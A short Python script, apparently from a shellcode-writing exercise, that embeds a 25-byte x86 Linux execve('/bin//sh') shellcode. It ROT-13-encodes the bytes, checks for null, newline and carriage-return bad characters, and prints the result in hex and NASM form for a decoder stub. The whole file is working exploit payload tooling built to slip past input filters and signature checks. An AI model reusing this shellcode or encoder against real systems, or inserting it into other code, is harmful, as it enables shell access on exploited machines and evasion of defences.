#!/usr/bin/python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

rot = 13
badchars = ("\x00\x0a\x0d")

def encode(shellcode):
    encoded = []
    for c in bytearray(shellcode):
        byte = (c + rot) % 256
        encoded.append(byte)
        if badchar(byte):
            print("Bad char detected: ",c,byte)
    return encoded

def badchar(byte):
    if byte in bytearray(badchars):
        return True
    else:
        return False

print ("Input:   " + "".join("\\x%02x" %c for c in bytearray(shellcode)))
print ("Encoded: " + "".join("\\x%02x" %c for c in encode(shellcode)))
print ("NASM:    " + ",".join("0x%02x" %c for c in encode(shellcode)))